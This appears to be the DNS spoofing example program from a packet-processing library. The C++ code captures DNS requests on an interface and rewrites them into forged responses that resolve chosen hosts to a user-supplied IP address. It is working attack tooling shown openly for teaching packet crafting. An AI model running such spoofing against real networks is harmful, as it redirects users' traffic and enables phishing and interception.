/**
 * DNS spoofing example application
 * ================================
 * This application does simple DNS spoofing. It's provided with interface name or IP and starts capturing DNS requests on that
 * interface. Each DNS request that matches is edited and turned into a DNS response with a user-provided IPv4 as the resolved IP.
 * Then it's sent back on the network on the same interface
 */

#include <vector>
#include <algorithm>
#include <sstream>
#include <utility>
#include <map>
#if !defined(WIN32) && !defined(WINx64) //for using ntohl, ntohs, etc.
#include <in.h>
#include <errno.h>
#endif
#include "IpAddress.h"
#include "RawPacket.h"
#include "ProtocolType.h"
#include "Packet.h"
#include "EthLayer.h"
#include "IPv4Layer.h"
#include "UdpLayer.h"
#include "DnsLayer.h"
#include "PcapFilter.h"
#include "PcapLiveDevice.h"
#include "PcapLiveDeviceList.h"
#include "PlatformSpecificUtils.h"
#include "SystemUtils.h"
#include "PcapPlusPlusVersion.h"

#include <getopt.h>

#define EXIT_WITH_ERROR(reason, ...) do { \
	printf("DnsSpoofing terminated in error: " reason "\n", ## __VA_ARGS__); \
	exit(1); \
	} while(0)

using namespace pcpp;

static struct option DnsSpoofingOptions[] =
{
	{"interface",  required_argument, 0, 'i'},
	{"spoof-dns-server", required_argument, 0, 'd'},
	{"client-ip", required_argument, 0, 'c'},
	{"host-list", required_argument, 0, 'o'},
	{"help", no_argument, 0, 'h'},
	{"version", no_argument, 0, 'v'},
	{"list", no_argument, 0, 'l'},
    {0, 0, 0, 0}
};


/**
 * A struct that holds all counters that are collected during application runtime
 */
struct DnsSpoofStats
{
	int numOfSpoofedDnsRequests;
	std::map<std::string, int> spoofedHosts;

	DnsSpoofStats() : numOfSpoofedDnsRequests(0) {}
};


/**
 * A struct that holds all arguments passed to handleDnsRequest()
 */
struct DnsSpoofingArgs
{
	IPv4Address dnsServer;
	std::vector<std::string> dnsHostsToSpoof;
	DnsSpoofStats stats;
	bool shouldStop;

	DnsSpoofingArgs() : dnsServer(IPv4Address::Zero), shouldStop(false) {}
};


/**
 * The method that is called each time a DNS request is received. This methods turns the DNS request into a DNS response with the
 * spoofed information and sends it back to the network
 */
void handleDnsRequest(RawPacket* packet, PcapLiveDevice* dev, void* cookie)
{
	DnsSpoofingArgs* args = (DnsSpoofingArgs*)cookie;

	// create a parsed packet from the raw packet
	Packet dnsRequest(packet);

	if (!dnsRequest.isPacketOfType(DNS) || !dnsRequest.isPacketOfType(IPv4) || !dnsRequest.isPacketOfType(UDP) || !dnsRequest.isPacketOfType(Ethernet))
		return;

	// extract all packet layers
	EthLayer* ethLayer = dnsRequest.getLayerOfType<EthLayer>();
	IPv4Layer* ip4Layer = dnsRequest.getLayerOfType<IPv4Layer>();
	UdpLayer* udpLayer = dnsRequest.getLayerOfType<UdpLayer>();
	DnsLayer* dnsLayer = dnsRequest.getLayerOfType<DnsLayer>();

	// skip DNS requests with more than 1 request or with 0 requests
	if (dnsLayer->getDnsHeader()->numberOfQuestions != htons(1) ||
		dnsLayer->getFirstQuery() == NULL)
		return;

	// skip DNS requests which are not of class IN and type A (IPv4)
	DnsQuery* dnsQuery = dnsLayer->getFirstQuery();
	if (dnsQuery->getDnsType() != DNS_TYPE_A || dnsQuery->getDnsClass() != DNS_CLASS_IN)
		return;

	// empty dnsHostsToSpoof means spoofing all hosts
	if (!args->dnsHostsToSpoof.empty())
	{
		bool hostMatch = false;

		// go over all hosts in dnsHostsToSpoof list and see if current query matches one of them
		for (std::vector<std::string>::iterator iter = args->dnsHostsToSpoof.begin(); iter != args->dnsHostsToSpoof.end(); iter++)
		{
			if (dnsLayer->getQuery(*iter, false) != NULL)
			{
				hostMatch = true;
				break;
			}
		}

		if (!hostMatch)
			return;
	}


	// create a response out of the request packet

	// reverse src and dst MAC addresses
	MacAddress srcMac = ethLayer->getSourceMac();
	ethLayer->setSourceMac(ethLayer->getDestMac());
	ethLayer->setDestMac(srcMac);

	// reverse src and dst IP addresses
	IPv4Address srcIP = ip4Layer->getSrcIpAddress();
	ip4Layer->setSrcIpAddress(ip4Layer->getDstIpAddress());
	ip4Layer->setDstIpAddress(srcIP);

	ip4Layer->getIPv4Header()->ipId = 0;

	// reverse src and dst UDP ports
	uint16_t srcPort = udpLayer->getUdpHeader()->portSrc;
	udpLayer->getUdpHeader()->portSrc = udpLayer->getUdpHeader()->portDst;
	udpLayer->getUdpHeader()->portDst = srcPort;

	// add DNS response
	dnsLayer->getDnsHeader()->queryOrResponse = 1;
	IPv4Address dnsServer = args->dnsServer;
	if (!dnsLayer->addAnswer(dnsQuery->getName(), DNS_TYPE_A, DNS_CLASS_IN, 1, dnsServer.toString()))
		return;

	dnsRequest.computeCalculateFields();

	// send DNS response back to the network
	if (!dev->sendPacket(&dnsRequest))
		return;

	args->stats.numOfSpoofedDnsRequests++;
	args->stats.spoofedHosts[dnsQuery->getName()]++;
}


/**
 * A callback for application interrupted event (ctrl+c): print DNS spoofing summary
 */
void onApplicationInterrupted(void* cookie)
{
	DnsSpoofingArgs* args = (DnsSpoofingArgs*)cookie;
	if (args->stats.spoofedHosts.size() == 0)
	{
		printf("\nApplication closing. No hosts were spoofed\n");
	}
	else
	{
		printf("\nApplication closing\nSummary of spoofed hosts:\n"
				 "-------------------------\n");

		for (std::map<std::string, int>::iterator iter = args->stats.spoofedHosts.begin(); iter != args->stats.spoofedHosts.end(); iter++)
			printf("Host [%s]: spoofed %d times\n", iter->first.c_str(), iter->second);
	}
	args->shouldStop = true;
}


/**
 * Activate DNS spoofing: prepare the device and start capturing DNS requests
 */
void doDnsSpoofing(PcapLiveDevice* dev, IPv4Address dnsServer, IPv4Address clientIP, std::vector<std::string> dnsHostsToSpoof)
{
	// open device
	if (!dev->open())
		EXIT_WITH_ERROR("Cannot open capture device");

	// set a filter to capture only DNS requests and client IP if provided
	PortFilter dnsPortFilter(53, DST);
	if (clientIP == IPv4Address::Zero)
	{
		if (!dev->setFilter(dnsPortFilter))
			EXIT_WITH_ERROR("Cannot set DNS filter for device");
	}
	else
	{
		IPFilter clientIpFilter(clientIP.toString(), SRC);
		std::vector<GeneralFilter*> filterForAnd;
		filterForAnd.push_back(&dnsPortFilter);
		filterForAnd.push_back(&clientIpFilter);
		AndFilter andFilter(filterForAnd);

		if (!dev->setFilter(andFilter))
			EXIT_WITH_ERROR("Cannot set DNS and client IP filter for device");
	}

	// make args for callback
	DnsSpoofingArgs args;
	args.dnsServer = dnsServer;
	args.dnsHostsToSpoof = dnsHostsToSpoof;

	// start capturing DNS requests
	if (!dev->startCapture(handleDnsRequest, &args))
		EXIT_WITH_ERROR("Cannot start packet capture");


	// register the on app close event to print summary stats on app termination
	ApplicationEventHandler::getInstance().onApplicationInterrupted(onApplicationInterrupted, &args);

	// run an endless loop until ctrl+c is pressed
	while (!args.shouldStop)
	{
		printf("Spoofed %d DNS requests so far\n", args.stats.numOfSpoofedDnsRequests);
		PCAP_SLEEP(5);
	}
}



/**
 * go over all interfaces and output their names
 */
void listInterfaces()
{
	const std::vector<PcapLiveDevice*>& devList = PcapLiveDeviceList::getInstance().getPcapLiveDevicesList();

	printf("\nNetwork interfaces:\n");
	for (std::vector<PcapLiveDevice*>::const_iterator iter = devList.begin(); iter != devList.end(); iter++)
	{
		printf("    -> Name: '%s'   IP address: %s\n", (*iter)->getName(), (*iter)->getIPv4Address().toString().c_str());
	}
	exit(0);
}


/**
 * Print application usage
 */
void printUsage()
{
	printf("\nUsage:\n"
			"------\n"
			"%s [-hvl] [-o host1,host2,...,host_n] [-c ip_address] -i interface -d ip_address\n"
			"\nOptions:\n\n"
			"    -h                          : Displays this help message and exits\n"
			"    -v                          : Displays the current version and exists\n"
			"    -l                          : Print the list of available interfaces\n"
			"    -i interface                : The interface name or interface IP address to use. Use the -l switch to see all interfaces\n"
			"    -d ip_address               : The IPv4 address of the spoofed DNS server (all responses will be sent with this IP address)\n"
			"    -c ip_address               : Spoof only DNS requests coming from a specific IPv4 address\n"
			"    -o host1,host2,...,host_n   : A comma-separated list of hosts to spoof. If list is not given, all hosts will be spoofed.\n"
			"                                  If an host contains '*' all sub-domains will be spoofed, for example: if '*.google.com' is given\n"
			"                                  then 'mail.google.com', 'tools.google.com', etc. will be spoofed\n\n", AppName::get().c_str());
}


/**
 * Print application version
 */
void printAppVersion()
{
	printf("%s %s\n", AppName::get().c_str(), getPcapPlusPlusVersionFull().c_str());
	printf("Built: %s\n", getBuildDateTime().c_str());
	printf("Built from: %s\n", getGitInfo().c_str());
	exit(0);
}


/**
 * main method of the application
 */
int main(int argc, char* argv[])
{
	AppName::init(argc, argv);

	int optionIndex = 0;
	char opt = 0;

	std::string interfaceNameOrIP("");

	IPv4Address dnsServer = IPv4Address::Zero;

	IPv4Address clientIP = IPv4Address::Zero;
	bool clientIpSet = false;

	std::vector<std::string> hostList;

	while((opt = getopt_long (argc, argv, "i:d:c:o:hvl", DnsSpoofingOptions, &optionIndex)) != -1)
	{
		switch (opt)
		{
			case 0:
			{
				break;
			}
			case 'h':
			{
				printUsage();
				exit(0);
			}
			case 'v':
			{
				printAppVersion();
				break;
			}
			case 'l':
			{
				listInterfaces();
				exit(0);
			}
			case 'i':
			{
				interfaceNameOrIP = optarg;
				break;
			}
			case 'd':
			{
				dnsServer = IPv4Address(optarg);
				break;
			}
			case 'c':
			{
				clientIP = IPv4Address(optarg);
				clientIpSet = true;
				break;
			}
			case 'o':
			{
				std::string input = optarg;
				std::istringstream stream(input);
				std::string token;

				while(std::getline(stream, token, ','))
				    hostList.push_back(token);
				break;
			}
			default:
			{
				printUsage();
				exit(1);
			}
		}
	}

	PcapLiveDevice* dev = NULL;

	// check if interface argument is IP or name and extract the device
	if (interfaceNameOrIP == "")
	{
		EXIT_WITH_ERROR("Interface name or IP weren't provided. Please use the -i switch or -h for help");
	}

	IPv4Address interfaceIP(interfaceNameOrIP);
	if (interfaceIP.isValid())
	{
		dev = PcapLiveDeviceList::getInstance().getPcapLiveDeviceByIp(interfaceIP);
		if (dev == NULL)
			EXIT_WITH_ERROR("Couldn't find interface by provided IP");
	}
	else
	{
		dev = PcapLiveDeviceList::getInstance().getPcapLiveDeviceByName(interfaceNameOrIP);
		if (dev == NULL)
			EXIT_WITH_ERROR("Couldn't find interface by provided name");
	}

	// verify DNS server IP is a valid IPv4 address
	if (dnsServer == IPv4Address::Zero ||  !dnsServer.isValid())
		EXIT_WITH_ERROR("Spoof DNS server IP provided is empty or not a valid IPv4 address");

	// verify client IP is valid if set
	if (clientIpSet && !clientIP.isValid())
		EXIT_WITH_ERROR("Client IP to spoof is invalid");


	doDnsSpoofing(dev, dnsServer, clientIP, hostList);
}
